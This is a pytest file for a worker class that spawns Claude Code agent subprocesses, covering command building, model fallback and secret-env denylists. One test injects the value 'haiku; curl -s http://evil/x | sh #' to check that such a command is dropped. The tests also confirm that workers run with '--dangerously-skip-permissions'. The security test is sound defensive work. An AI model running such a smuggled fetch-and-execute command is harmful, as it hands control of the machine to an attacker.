"""Tests for pure-logic Worker methods (no subprocess needed)."""

from __future__ import annotations

import importlib.util
import sys
from pathlib import Path

import pytest

# ─── Load real Worker module bypassing conftest mock ──────────────────────────
# conftest.py patches sys.modules["worker"] with a MagicMock to prevent
# subprocess side-effects during task_queue tests. We need the real class here,
# so we load worker.py under a private name to bypass that mock.

_WORKER_FILE = Path(__file__).parent.parent / "worker.py"
_spec = importlib.util.spec_from_file_location("_real_worker", _WORKER_FILE)
_mod = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(_mod)  # type: ignore[union-attr]
Worker = _mod.Worker


# ─── Fixtures ─────────────────────────────────────────────────────────────────


@pytest.fixture
def worker(tmp_path: Path) -> Worker:
    """A Worker instance backed by tmp_path directories."""
    claude_dir = tmp_path / ".claude"
    claude_dir.mkdir()
    return Worker(
        task_id="task-abc123",
        description="Fix the login bug",
        model="sonnet",
        project_dir=tmp_path,
        claude_dir=claude_dir,
    )


# ─── Tests ────────────────────────────────────────────────────────────────────


def test_worker_init(worker: Worker) -> None:
    assert worker.status == "starting"
    assert len(worker.id) == 8
    assert worker.description == "Fix the login bug"


def test_worker_to_dict_keys(worker: Worker) -> None:
    d = worker.to_dict()
    expected_keys = {
        "id", "task_id", "description", "model", "status", "pid",
        "elapsed_s", "last_commit", "log_file", "verified",
        "auto_committed", "auto_pushed", "branch_name", "pr_url",
        "pr_merged", "log_tail", "failure_context", "worktree_path",
        "oracle_result", "oracle_reason", "model_score",
        "estimated_tokens", "context_warning",
        "input_tokens", "output_tokens", "estimated_cost",
    }
    assert expected_keys.issubset(d.keys())
    # description truncated to 80 chars
    assert len(d["description"]) <= 80


def test_worker_is_alive_false_when_no_proc(worker: Worker) -> None:
    assert worker.proc is None
    assert worker.is_alive() is False


def test_worker_elapsed_s(worker: Worker) -> None:
    t0 = worker.elapsed_s
    # elapsed_s should be non-negative and stable (same-second call)
    assert t0 >= 0
    t1 = worker.elapsed_s
    assert t1 >= t0


def test_worker_build_cmd_and_env(tmp_path: Path) -> None:
    claude_dir = tmp_path / ".claude"
    claude_dir.mkdir()
    w = Worker(
        task_id="task-xyz",
        description="Write tests",
        model="haiku",
        project_dir=tmp_path,
        claude_dir=claude_dir,
    )
    task_file = tmp_path / "task.md"
    task_file.write_text("do the thing")

    cmd, env = w._build_cmd_and_env(task_file)

    assert "--dangerously-skip-permissions" in cmd
    # model alias resolved: "haiku" → full model name
    assert "claude-haiku" in cmd
    # CLAUDECODE must not be in the env dict
    assert "CLAUDECODE" not in env
    # attribution: committer.sh appends Co-Authored-By + X-Clade-Task trailers
    # when this is set, so every worker-session commit is agent-segmentable
    assert env["CLADE_WORKER_TASK_ID"] == "task-xyz"
    # model provenance (Round-4 gap): committer.sh appends an Agent-Signature
    # trailer from this — must be the resolved model actually used for the
    # --model flag, not the raw alias ("haiku" → "claude-haiku...")
    assert env["CLADE_WORKER_MODEL"] == config._MODEL_ALIASES["haiku"]
    assert env["CLADE_WORKER_MODEL"] in cmd
    # gap C: overload failover is OFF by default (no flag leaks into the spawn)
    assert "--fallback-model" not in cmd


# ─── Overload failover (gap C) + spawn-env denylist (security sliver) ─────────

import config  # noqa: E402 — real config module shared with the worker under test


def _worker(tmp_path: Path, model: str = "sonnet") -> Worker:
    claude_dir = tmp_path / ".claude"
    claude_dir.mkdir(exist_ok=True)
    return Worker(task_id="t", description="d", model=model,
                  project_dir=tmp_path, claude_dir=claude_dir)


def test_fallback_model_explicit_alias(tmp_path: Path, monkeypatch) -> None:
    monkeypatch.setitem(config.GLOBAL_SETTINGS, "worker_fallback_model", "haiku")
    cmd, _ = _worker(tmp_path, model="opus")._build_cmd_and_env(tmp_path / "t.md")
    assert f"--fallback-model {config._MODEL_ALIASES['haiku']}" in cmd


def test_fallback_model_auto_downgrades_per_worker(tmp_path: Path, monkeypatch) -> None:
    # "auto" derives from auto_classify_retry_model_fallback: sonnet → haiku
    monkeypatch.setitem(config.GLOBAL_SETTINGS, "worker_fallback_model", "auto")
    cmd, _ = _worker(tmp_path, model="sonnet")._build_cmd_and_env(tmp_path / "t.md")
    assert f"--fallback-model {config._MODEL_ALIASES['haiku']}" in cmd


def test_fallback_model_auto_haiku_has_no_target(tmp_path: Path, monkeypatch) -> None:
    # haiku is the floor of the downgrade map → no fallback flag emitted
    monkeypatch.setitem(config.GLOBAL_SETTINGS, "worker_fallback_model", "auto")
    cmd, _ = _worker(tmp_path, model="haiku")._build_cmd_and_env(tmp_path / "t.md")
    assert "--fallback-model" not in cmd


def test_fallback_auto_recovers_full_id_alias(monkeypatch) -> None:
    # a full model id (not a short alias) must be reverse-mapped to its alias
    # before the downgrade lookup: claude-sonnet-4-6 → 'sonnet' → haiku
    monkeypatch.setitem(config.GLOBAL_SETTINGS, "worker_fallback_model", "auto")
    assert config._resolve_fallback_model(config._MODEL_ALIASES["sonnet"]) == config.HAIKU_MODEL


def test_fallback_auto_unknown_model_returns_none(monkeypatch) -> None:
    monkeypatch.setitem(config.GLOBAL_SETTINGS, "worker_fallback_model", "auto")
    assert config._resolve_fallback_model("some-unknown-model") is None


def test_fallback_model_rejects_non_model_value(tmp_path: Path, monkeypatch) -> None:
    # SECURITY: a user-controlled setting is spliced into the worker shell command;
    # a non-model value (injection / typo) must be dropped, never reach the shell.
    monkeypatch.setitem(config.GLOBAL_SETTINGS, "worker_fallback_model",
                        "haiku; curl -s http://evil/x | sh #")
    cmd, _ = _worker(tmp_path, model="opus")._build_cmd_and_env(tmp_path / "t.md")
    assert "--fallback-model" not in cmd
    assert "curl" not in cmd and "evil" not in cmd


def test_env_denylist_string_value_coerced(tmp_path: Path, monkeypatch) -> None:
    # a bare-string setting must strip the whole var, not iterate its characters
    monkeypatch.setenv("CLADE_ONE_SECRET", "leak-me")
    monkeypatch.setitem(config.GLOBAL_SETTINGS, "worker_env_deny", "CLADE_ONE_SECRET")
    _, env = _worker(tmp_path)._build_cmd_and_env(tmp_path / "t.md")
    assert "CLADE_ONE_SECRET" not in env


@pytest.mark.parametrize("bad", [5, True, 3.14, {"a": 1}])
def test_env_denylist_non_list_value_degrades_not_crashes(tmp_path: Path, monkeypatch, bad) -> None:
    # a scalar/dict misconfig must degrade to a no-op denylist, never crash the
    # spawn (iterating an int raises TypeError → would brick every worker)
    monkeypatch.setitem(config.GLOBAL_SETTINGS, "worker_env_deny", bad)
    cmd, env = _worker(tmp_path)._build_cmd_and_env(tmp_path / "t.md")  # must not raise
    assert "--dangerously-skip-permissions" in cmd


def test_env_denylist_pops_keys(tmp_path: Path, monkeypatch) -> None:
    monkeypatch.setenv("CLADE_TEST_SECRET", "leak-me")
    monkeypatch.setenv("CLADE_TEST_KEEP", "ok")
    monkeypatch.setitem(config.GLOBAL_SETTINGS, "worker_env_deny", ["CLADE_TEST_SECRET"])
    _, env = _worker(tmp_path)._build_cmd_and_env(tmp_path / "t.md")
    assert "CLADE_TEST_SECRET" not in env      # denied secret dropped from worker env
    assert env.get("CLADE_TEST_KEEP") == "ok"  # unrelated vars still pass through


def test_env_denylist_empty_is_noop(tmp_path: Path, monkeypatch) -> None:
    monkeypatch.setenv("CLADE_TEST_KEEP", "ok")
    monkeypatch.setitem(config.GLOBAL_SETTINGS, "worker_env_deny", [])
    _, env = _worker(tmp_path)._build_cmd_and_env(tmp_path / "t.md")
    assert env.get("CLADE_TEST_KEEP") == "ok"


# ─── Delegation to worker_utils (wave-2 extraction for the 1500-line cap) ─────


def test_check_file_ownership_delegates_to_worker_utils(worker: Worker) -> None:
    """Worker._check_file_ownership is a thin delegate over the moved glob logic."""
    worker.own_files = ["src/**"]
    worker.forbidden_files = ["secrets/**"]

    ok, reason = worker._check_file_ownership(["src/a.py"])
    assert ok is True
    assert reason == ""

    ok, reason = worker._check_file_ownership(["other/b.py"])
    assert ok is False
    assert "OWN_FILES" in reason

    ok, reason = worker._check_file_ownership(["secrets/key.pem"])
    assert ok is False
    assert "FORBIDDEN_FILES" in reason


def test_get_activity_state_delegates(worker: Worker) -> None:
    """No session JSONL under tmp claude_dir → 'unknown' via the moved helper."""
    assert worker._get_activity_state() == "unknown"


def test_classify_retry_helper_is_reexported_from_worker_utils() -> None:
    """Pure move + re-export: worker exposes the worker_utils function object."""
    import worker_utils

    assert _mod._maybe_enqueue_classify_retry is worker_utils._maybe_enqueue_classify_retry


# ─── context_budget_warning delivery (Round-4 dead-code fix) ──────────────────
# The warning file used to be keyed by the Worker's own internal `.id` — but the
# ONLY identifier available inside the worker's own hook environment is
# CLADE_WORKER_TASK_ID (task_id). context-warning-drain.sh looks the file up by
# task_id, so the write site must key by the same value or delivery can never
# find it.


async def test_context_budget_warning_keyed_by_task_id(tmp_path: Path, monkeypatch) -> None:
    from unittest.mock import AsyncMock

    from task_queue import TaskQueue

    claude_dir = tmp_path / ".claude"
    claude_dir.mkdir()
    w = Worker(
        task_id="task-abc123", description="x" * 700_000, model="sonnet",
        project_dir=tmp_path, claude_dir=claude_dir,
    )
    w.status = "running"
    w.task_timeout = 0
    monkeypatch.setattr(w, "poll", AsyncMock())  # no real subprocess to poll here

    pool = _mod.WorkerPool()
    pool.workers[w.id] = w
    tq = TaskQueue(claude_dir)

    await pool.poll_all(tq)

    assert (claude_dir / f"context-warning-{w.task_id}.md").exists()
    assert not (claude_dir / f"context-warning-{w.id}.md").exists()
